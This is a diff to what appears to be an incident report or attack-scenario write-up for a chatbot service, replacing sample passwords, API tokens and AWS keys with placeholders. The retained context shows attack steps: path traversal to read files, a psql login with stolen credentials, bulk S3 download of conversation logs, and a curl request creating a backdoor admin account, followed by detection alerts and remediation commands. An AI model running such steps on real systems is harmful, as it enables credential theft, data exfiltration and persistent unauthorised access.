@@ -110,20 +110,20 @@ GET /api/download?file=../../../../var/log/clawdbot/gateway.log
 **Stolen Credentials (.env file):**
 ```bash
 # Database
-DATABASE_URL=postgresql://clawdbot_user:P@ssw0rd123!@postgres:5432/clawdbot_prod
+DATABASE_URL=postgresql://clawdbot_user:REDACTED_DB_PASSWORD@postgres:5432/clawdbot_prod
 
 # API Keys
-ANTHROPIC_API_KEY=sk-ant-api03-abc123def456...
-SLACK_BOT_TOKEN=xoxb-1234567890-abcdefghijklmnop...
-SLACK_APP_TOKEN=xapp-1-A01234567-9876543210-abc123def456...
+ANTHROPIC_API_KEY=ANTHROPIC_API_KEY_EXAMPLE_NOT_REAL
+SLACK_BOT_TOKEN=SLACK_BOT_TOKEN_EXAMPLE_NOT_REAL
+SLACK_APP_TOKEN=SLACK_APP_TOKEN_EXAMPLE_NOT_REAL
 
 # Internal Services
-GATEWAY_API_KEY=gw_live_abc123def456...
-MCP_SERVER_AUTH_TOKEN=mcp_secret_xyz789...
+GATEWAY_API_KEY=GATEWAY_API_KEY_EXAMPLE_NOT_REAL
+MCP_SERVER_AUTH_TOKEN=MCP_SERVER_AUTH_TOKEN_EXAMPLE_NOT_REAL
 
 # AWS Credentials (for S3 conversation logs)
-AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+AWS_ACCESS_KEY_ID=AWS_ACCESS_KEY_ID_EXAMPLE_NOT_REAL
+AWS_SECRET_ACCESS_KEY=AWS_SECRET_ACCESS_KEY_EXAMPLE_NOT_REAL
 AWS_REGION=us-east-1
 AWS_S3_BUCKET=clawdbot-conversation-logs-prod
 ```
@@ -143,7 +143,7 @@ Used stolen database credentials to access PostgreSQL.
 **Database Enumeration:**
 ```sql
 -- Connect to database
-psql postgresql://clawdbot_user:P@ssw0rd123!@203.0.113.50:5432/clawdbot_prod
+psql postgresql://clawdbot_user:REDACTED_DB_PASSWORD@203.0.113.50:5432/clawdbot_prod
 
 -- List tables
 \dt
@@ -195,8 +195,8 @@ Used stolen AWS credentials to access conversation logs in S3.
 **S3 Enumeration:**
 ```bash
 # Configure AWS CLI with stolen credentials
-export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+export AWS_ACCESS_KEY_ID=AWS_ACCESS_KEY_ID_EXAMPLE_NOT_REAL
+export AWS_SECRET_ACCESS_KEY=AWS_SECRET_ACCESS_KEY_EXAMPLE_NOT_REAL
 
 # List S3 buckets
 aws s3 ls
@@ -234,7 +234,7 @@ aws s3 sync s3://clawdbot-conversation-logs-prod/2025/12/ ./stolen-logs/
   "messages": [
     {
       "role": "user",
-      "content": "Can you help me access the customer database? My credentials are:\nUsername: admin@company.com\nPassword: CompanySecret2025!\nDatabase: prod-db.company.internal"
+      "content": "Can you help me access the customer database? My credentials are:\nUsername: admin@example.internal\nPassword: REDACTED_CUSTOMER_PASSWORD\nDatabase: prod-db.example.internal"
     },
     {
       "role": "assistant",
@@ -267,7 +267,7 @@ Used stolen `GATEWAY_API_KEY` to authenticate to ClawdBot gateway API.
 **Gateway Authentication:**
 ```bash
 # Test authentication
-curl -H "Authorization: Bearer gw_live_abc123def456..." \
+curl -H "Authorization: Bearer <redacted example token>" \
   https://gateway.clawdbot.example.com/api/v1/health
 
 Response: 200 OK
@@ -282,18 +282,18 @@ Response: 200 OK
 **Privilege Escalation:**
 ```bash
 # Enumerate admin endpoints
-curl -H "Authorization: Bearer gw_live_abc123def456..." \
+curl -H "Authorization: Bearer <redacted example token>" \
   https://gateway.clawdbot.example.com/api/v1/admin/users
 
 Response: 200 OK (full user list)
 
 # Create backdoor admin account
 curl -X POST \
-  -H "Authorization: Bearer gw_live_abc123def456..." \
+  -H "Authorization: Bearer <redacted example token>" \
   -H "Content-Type: application/json" \
   -d '{
     "email": "backdoor@temp-mail.io",
-    "password": "BackdoorAccess123!",
+    "password": "EXAMPLE_BACKDOOR_PASSWORD_NOT_REAL",
     "role": "admin",
     "subscription_tier": "enterprise"
   }' \
@@ -321,7 +321,7 @@ ALERT: InstanceCredentialExfiltration.S3
 Severity: HIGH
 Description: AWS credentials used from non-standard location
 Details:
-  - Credential: AWS_ACCESS_KEY_ID (AKIAIOSFODNN7EXAMPLE)
+  - Credential: AWS_ACCESS_KEY_ID (AWS_ACCESS_KEY_ID_EXAMPLE_NOT_REAL)
   - Source IP: 45.134.67.89 (non-AWS IP, Germany)
   - Action: S3 ListBucket, GetObject (bulk download)
   - Unusual: IP never seen before, high volume download
@@ -341,18 +341,18 @@ Details:
 **Immediate Actions:**
 ```bash
 # 1. Rotate AWS credentials (30 seconds)
-aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE
+aws iam delete-access-key --access-key-id AWS_ACCESS_KEY_ID_EXAMPLE_NOT_REAL
 aws iam create-access-key --user-name clawdbot-service
 
 # 2. Revoke Anthropic API key (via dashboard)
-# Revoked: sk-ant-api03-abc123def456...
+# Revoked: ANTHROPIC_API_KEY_EXAMPLE_NOT_REAL
 # New key: sk-ant-api03-xyz789ghi012...
 
 # 3. Reset database password
 ALTER USER clawdbot_user WITH PASSWORD 'NewSecurePassword!2025';
 
 # 4. Revoke gateway API keys
-DELETE FROM api_keys WHERE key = 'gw_live_abc123def456...';
+DELETE FROM api_keys WHERE key = 'GATEWAY_API_KEY_EXAMPLE_NOT_REAL';
 
 # 5. Remove backdoor account
 DELETE FROM users WHERE email = 'backdoor@temp-mail.io';
